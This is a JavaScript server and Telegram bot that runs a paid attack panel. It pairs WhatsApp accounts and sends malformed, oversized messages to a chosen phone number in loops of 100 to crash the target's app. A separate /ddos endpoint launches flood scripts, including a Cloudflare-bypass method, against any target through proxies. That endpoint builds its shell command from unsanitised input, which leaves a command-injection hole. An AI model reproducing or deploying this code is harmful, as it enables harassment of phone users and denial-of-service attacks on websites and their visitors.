const { Token, owner } = require("./config");
const express = require("express");
const fs = require("fs");
const path = require("path");
const cookieParser = require('cookie-parser');
const cors = require('cors');
const crypto = require('crypto');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(express.static('public'));
app.use(cookieParser());
app.use(cors());

const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const sessions = new Map();
const bot = new Telegraf(Token);

// Load accounts from acc.json
const loadAccounts = () => {
  try {
    const data = fs.readFileSync('./acc.json', 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading accounts:', error);
    return [];
  }
};

// Generate JWT-like token
const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: user.role,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
};

// Verify token
const verifyToken = (token) => {
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64').toString());
    const accounts = loadAccounts();
    const user = accounts.find(acc => acc.username === payload.username);
    return user ? payload : null;
  } catch (error) {
    return null;
  }
};

// Authentication middleware
const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const payload = verifyToken(token);

  if (!payload) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  req.user = payload;
  next();
};

// Web routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/ddos-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos-dashboard.html'));
});

// Helper function to check if account is expired
const isAccountExpired = (expired) => {
  if (!expired) return false;

  const now = new Date();
  const expiryDate = parseExpiryDate(expired);

  return now > expiryDate;
};

// Helper function to parse expiry date (1d, 1h, etc.)
const parseExpiryDate = (expired) => {
  if (!expired) return new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 1 year default

  const regex = /^(\d+)([dhmy])$/i;
  const match = expired.match(regex);

  if (!match) return new Date(expired); // Try parsing as regular date

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  const now = new Date();

  switch (unit) {
    case 'd': return new Date(now.getTime() + value * 24 * 60 * 60 * 1000);
    case 'h': return new Date(now.getTime() + value * 60 * 60 * 1000);
    case 'm': return new Date(now.getTime() + value * 30 * 24 * 60 * 60 * 1000);
    case 'y': return new Date(now.getTime() + value * 365 * 24 * 60 * 60 * 1000);
    default: return new Date(now.getTime() + 24 * 60 * 60 * 1000); // 1 day default
  }
};

// Function to clean expired accounts
const cleanExpiredAccounts = () => {
  const accounts = loadAccounts();
  const validAccounts = accounts.filter(acc => !isAccountExpired(acc.expired));

  if (validAccounts.length !== accounts.length) {
    fs.writeFileSync('./acc.json', JSON.stringify(validAccounts, null, 2));
    console.log(`Removed ${accounts.length - validAccounts.length} expired accounts`);
  }
};

// Clean expired accounts on startup and every hour
cleanExpiredAccounts();
setInterval(cleanExpiredAccounts, 60 * 60 * 1000);

// API routes
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const accounts = loadAccounts();

  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (user) {
    // Check if account is expired
    if (isAccountExpired(user.expired)) {
      // Remove expired account
      const updatedAccounts = accounts.filter(acc => acc.username !== username);
      fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));

      return res.status(401).json({
        success: false,
        message: 'Account has expired'
      });
    }

    // Ensure role is either ADMIN or VIP
    const validRole = ['ADMIN', 'VIP'].includes(user.role.toUpperCase()) ? user.role.toUpperCase() : 'VIP';

    const token = generateToken(user);
    res.json({
      success: true,
      token,
      user: {
        username: user.username,
        role: validRole,
        expired: user.expired
      }
    });
  } else {
    res.status(401).json({
      success: false,
      message: 'Invalid credentials'
    });
  }
});

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

  for (const botNumber of activeNumbers) {
    console.log(`Menghubungkan WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "open") {
        console.log(`Bot ${botNumber} terhubung!`);
        sessions.set(botNumber, sock);
      }
      if (connection === "close") {
        const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        if (reconnect) {
          console.log(`Koneksi ditutup untuk ${botNumber}, mencoba menghubungkan kembali...`);
          sessions.delete(botNumber);
          await connectToWhatsApp(botNumber, null, null);
        } else {
          console.log(`Sesi ${botNumber} keluar.`);
          sessions.delete(botNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
          const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
          const updated = data.filter(n => n !== botNumber);
          fs.writeFileSync(file_session, JSON.stringify(updated));
        }
      }
    });
    sock.ev.on("creds.update", saveCreds);
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage;
  if (ctx) {
    statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
      parse_mode: "Markdown"
    });
  }

  const editStatus = async (text) => {
    if (ctx && chatId && statusMessage) {
      try {
        await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
          parse_mode: "Markdown"
        });
      } catch (e) {
        console.error("Gagal edit pesan:", e.message);
      }
    } else {
      console.log(text);
    }
  };

  let paired = false;

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await sock.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, sock);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log(`Reconnect diperlukan untuk ${botNumber}`);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
        sessions.delete(botNumber);
        const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
        const updated = data.filter(n => n !== botNumber);
        fs.writeFileSync(file_session, JSON.stringify(updated));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) =>
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

// ====================== BOT TELEGRAM ======================
bot.use(async (ctx, next) => {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  return next();
});

bot.start((ctx) => {
  ctx.replyWithVideo(
    { url: 'https://files.catbox.moe/tcv2pi.mp4' },
    {
      caption: `
welcome to Zenith strom, i can only help with this

╭─────────
│ 🔹 /create <username> <password> <role> <expired>
│ 🔹 /listakun
│ 🔹 /delakun <username>
│ 🔹 /pairing <number>
│ 🔹 /listpairing
│ 🔹 /delpairing <number>
╰──────────`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/Ryverzoffc')],
        [Markup.button.url('📢 Join Channel', 'https://t.me/ryverzoffc')]
      ])
    }
  );
});

bot.command("create", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");

  const args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`Use: \`/create <username> <password> <role> <expired>\`

*Valid roles:* ADMIN, VIP
*Expired format:* 1d=1 day, 1h=1 hour, 1m=1 month, 1y=1 year
*Example:* \`/create user123 pass123 VIP 30d\``, { parse_mode: "Markdown" });
  }

  const [, username, password, role, expired] = args;
  const accounts = loadAccounts();

  // Validate role
  const validRoles = ['ADMIN', 'VIP'];
  if (!validRoles.includes(role.toUpperCase())) {
    return ctx.reply("❌ Invalid role! Use: ADMIN or VIP");
  }

  // Check if username already exists
  if (accounts.find(acc => acc.username === username)) {
    return ctx.reply("❌ Username already exists.");
  }

  // Validate expired format if provided
  if (expired && expired !== "" && !expired.match(/^(\d+)([dhmy])$/i)) {
    return ctx.reply("❌ Invalid expired format! Use: 1d, 1h, 1m, 1y (d=day, h=hour, m=month, y=year)");
  }

  // Add new account
  accounts.push({
    username,
    password,
    role: role.toUpperCase(),
    expired: expired || ""
  });

  // Save to acc.json
  fs.writeFileSync('./acc.json', JSON.stringify(accounts, null, 2));

  const expiryText = expired ? `Expires in: ${expired}` : "Never expires";

  ctx.reply(`
╭─────────────────────╮
┃✅ Account created successfully!
┃👤 Username: \`${username}\`
┃🔑 Password: \`${password}\`
┃👑 Role: \`${role.toUpperCase()}\`
┃⏰ ${expiryText}
╰─────────────────────╯`, { parse_mode: "Markdown" });
});

bot.command("listakun", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");

  const accounts = loadAccounts();
  if (accounts.length === 0) {
    return ctx.reply("No accounts found.");
  }

  const list = accounts.map((acc, index) => 
    `${index + 1}. ${acc.username} (${acc.role}) - ${acc.expired || "Never expires"}`
  ).join("\n");

  ctx.reply(`*Account List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delakun", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");

  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delakun <username>");

  const username = args[1];
  const accounts = loadAccounts();
  const initialLength = accounts.length;
  const updatedAccounts = accounts.filter(acc => acc.username !== username);

  if (updatedAccounts.length === initialLength) {
    return ctx.reply("❌ Username not found.");
  }

  fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
  ctx.reply(`✅ Account ${username} deleted successfully.`);
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delpairing 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

// ====================== FUNCTION BUG ======================
async function delay(sock, jid, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "sayonara...",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => 
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "Hp Kentang Dilarang Coba²"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(jid, MSG, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  // Check if mention is true before running relayMessage
  if (mention) {
    await sock.relayMessage(
      jid,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "kontol lor" },
            content: undefined
          }
        ]
      }
    );
  }
}


async function NatCallX(isTarget, ptcp = true) {
    let msg = await generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "#ZenithStrom",
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "{".repeat(100)
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{".repeat(100)
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    let X = await sock.relayMessage(
        isTarget,
        msg.message,
        ptcp
            ? { participant: { jid: isTarget }, messageId: msg.key.id }
            : { messageId: msg.key.id }
    );

    console.log(chalk.green("By ZenithStrom"));

    setTimeout(async () => {
        try {
            await sock.sendMessage(isTarget, {
                delete: {
                    remoteJid: isTarget,
                    fromMe: true,
                    id: msg.key.id,
                    participant: ptcp ? isTarget : undefined
                }
            });
        } catch (err) {
            console.error("Eror:", err);
        }
    }, 500); 
}


function toValidJid(nomor) {
  nomor = nomor.replace(/\D/g, '');

  if (nomor.startsWith("0")) {
    nomor = "62" + nomor.slice(1);
  } else if (nomor.startsWith("8")) {
    nomor = "62" + nomor;
  }

  if (nomor.length < 8 || nomor.length > 15) return null;

  return `${nomor}@s.whatsapp.net`;
}

app.get("/attack/metode", requireAuth, async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();

    if (!metode || !target) {
      return res.status(400).json({
        status: false,
        message: "'method' and 'target' parameters are required"
      });
    }

    const jid = toValidJid(target);
    if (!jid) {
      return res.status(400).json({
        status: false,
        message: "Nomor tidak valid"
      });
    }

    let decoded;
    try {
      decoded = jidDecode(jid);
    } catch (e) {
      return res.status(400).json({
        status: false,
        message: "JID decode gagal"
      });
    }

    if (typeof decoded !== 'object' || !decoded?.user || !isJidUser(jid)) {
      return res.status(400).json({
        status: false,
        message: "Invalid JID target (not a user JID or decode failed)"
      });
    }

    if (sessions.size === 0) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const notifPesan = `
╭─────────────────
│New request bug 🦠
│👤From User: ${req.user.username} (${req.user.role})
│🖥️From IP: ${ipClient}
│⌛Time: ${waktu}
│⚠️Method: ${metode}
│📦Target: ${target}
╰─────────────────
Bot By: @Ryverzoffc
    `;
    await bot.telegram.sendMessage(owner, notifPesan);

    const botNumber = [...sessions.keys()][0];
    if (!botNumber) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const sock = sessions.get(botNumber);
    if (!sock) {
      return res.status(400).json({
        status: false,
        message: "Socket not found for active bot number"
      });
    }

    const send = async (fn) => {
      for (let i = 0; i < 100; i++) {
        await fn(sock, jid);
      }
    };

    switch (metode.toLowerCase()) {
      case "foreclose":
      case "forcecall":
        await send(delay);
        break;
      case "blank":
      case "crash":
        await send(delay);
        break;
      case "ios":
        await send(delay);
        break;
      case "delay":
        await send(delay);
        break;
      case "native":
        await send(delay);
        break;
      case "combo":
        for (let i = 0; i < 2; i++) {
          await NatCallX(sock, jid);
        }
        break;
      default:
        return res.status(400).json({
          status: false,
          message: "metode tidak dikenali. Available: foreclose, forcecall, blank, crash, ios, delay, native, combo"
        });
    }

    return res.json({
      status: "200",
      creator: "@Ryverzoffc",
      result: "sukses",
      target: jid.split("@")[0],
      metode: metode.toLowerCase(),
      user: req.user.username
    });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({
      status: false,
      message: "Fitur Sedang Ada Perbaikan"
    });
  }
});

// DDOS Attack endpoint
app.get("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time, proxyUrl } = req.query;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();

    if (!key || !metode || !target || !time) {
      return res.status(400).json({ 
        status: false, 
        message: "Required parameters: key, metode, target, time" 
      });
    }

    if (key !== "NullByte") {
      return res.status(403).json({ 
        status: false, 
        message: "Incorrect API key" 
      });
    }

    const validMethods = ["xp-net", "xp-glory", "xp-bypass", "xp-cf", "xp-hold"];
    if (!validMethods.includes(metode)) {
      return res.status(400).json({ 
        status: false, 
        message: `Method '${metode}' is not recognized. Valid methods: ${validMethods.join(', ')}` 
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({ 
        status: false, 
        message: "Time must be 1 - 500 seconds" 
      });
    }

    // Handle proxy URL if provided
    let proxyStatus = "Using existing proxies";
    if (proxyUrl && proxyUrl.trim()) {
      try {
        const https = require('https');
        const http = require('http');
        const urlModule = require('url');

        const parsedUrl = urlModule.parse(proxyUrl);
        const protocol = parsedUrl.protocol === 'https:' ? https : http;

        await new Promise((resolve, reject) => {
          const request = protocol.get(proxyUrl, (response) => {
            let data = '';

            response.on('data', (chunk) => {
              data += chunk;
            });

            response.on('end', () => {
              if (response.statusCode === 200) {
                // Validate proxy format (host:port per line)
                const proxies = data.split('\n')
                  .map(line => line.trim())
                  .filter(line => line && line.includes(':'))
                  .filter(line => {
                    const [host, port] = line.split(':');
                    return host && port && !isNaN(parseInt(port));
                  });

                if (proxies.length > 0) {
                  // Append to existing proxy.txt
                  const existingProxies = fs.existsSync('./proxy.txt') 
                    ? fs.readFileSync('./proxy.txt', 'utf-8').split('\n').filter(Boolean)
                    : [];

                  const allProxies = [...new Set([...existingProxies, ...proxies])]; // Remove duplicates
                  fs.writeFileSync('./proxy.txt', allProxies.join('\n'));

                  proxyStatus = `Added ${proxies.length} new proxies (${allProxies.length} total)`;
                } else {
                  proxyStatus = "No valid proxies found in URL";
                }
                resolve();
              } else {
                proxyStatus = `Failed to fetch proxies (HTTP ${response.statusCode})`;
                resolve();
              }
            });
          });

          request.on('error', (error) => {
            console.error('Proxy fetch error:', error);
            proxyStatus = "Failed to fetch proxy list";
            resolve();
          });

          request.setTimeout(10000, () => {
            request.destroy();
            proxyStatus = "Proxy fetch timeout";
            resolve();
          });
        });
      } catch (error) {
        console.error('Proxy URL processing error:', error);
        proxyStatus = "Error processing proxy URL";
      }
    }

    // Notify via Telegram
    const notifPesan = `
╭─────────────────
│New DDOS request 💣
│👤From User: ${req.user.username} (${req.user.role})
│🖥️From IP: ${ipClient}
│⌛Time: ${waktu}
│⚠️Method: ${metode}
│📦Target: ${target}
│⏳Duration: ${duration}s
│🌐Proxy: ${proxyStatus}
╰─────────────────
Bot By: @Ryverzoffc
    `;
    await bot.telegram.sendMessage(owner, notifPesan);

    let command;
    const { exec } = require("child_process");

    if (metode === "xp-net") {
      console.log("📡 xp-net method received");
      command = `node xp-net.js ${target} ${duration} proxy.txt`;
    } else if (metode === "xp-hold") {
      console.log("⚔️ xp-hold method received");
      command = `node xp-hold.js ${target} ${duration} proxy.txt`;
    } else if (metode === "xp-bypass") {
      console.log("🛠️ xp-bypass method received");
      command = `node xp-bypass.js ${target} ${duration} 100 10 proxy.txt`;
    } else if (metode === "xp-glory") {
      console.log("🌊 xp-glory method received");
      command = `node xp-glory.js ${target} ${duration} 100 10 proxy.txt`;
    } else if (metode === "xp-cf") {
      console.log("☁️ xp-cf method received");
      command = `node xp-cf.js ${target} ${duration} 100 10 proxy.txt`;
    } else {
      return res.status(500).json({ 
        status: false, 
        message: "The method has not been handled on the server." 
      });
    }

    // Execute DDOS command
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.warn(`Stderr: ${stderr}`);
      }
      console.log(`Output: ${stdout}`);
    });

    res.json({
      status: true,
      Target: target,
      Methods: metode,
      Time: duration,
      News: "Success",
      proxyStatus: proxyStatus
    });

  } catch (err) {
    console.error("DDOS attack error:", err);
    return res.status(500).json({
      status: false,
      message: "Internal server error"
    });
  }
});

// 404 middleware - must be after all other routes
app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    message: 'Internal Server Error'
  });
});

// ====================== INISIALISASI ======================
initializeWhatsAppConnections();
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server is running on port ${PORT}`);
  console.log(`📱 Access dashboard: http://0.0.0.0:${PORT}/dashboard`);
  console.log(`⚡ Access DDOS panel: http://0.0.0.0:${PORT}/ddos-dashboard`);
  console.log(`🌐 Public URL: https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co`);
});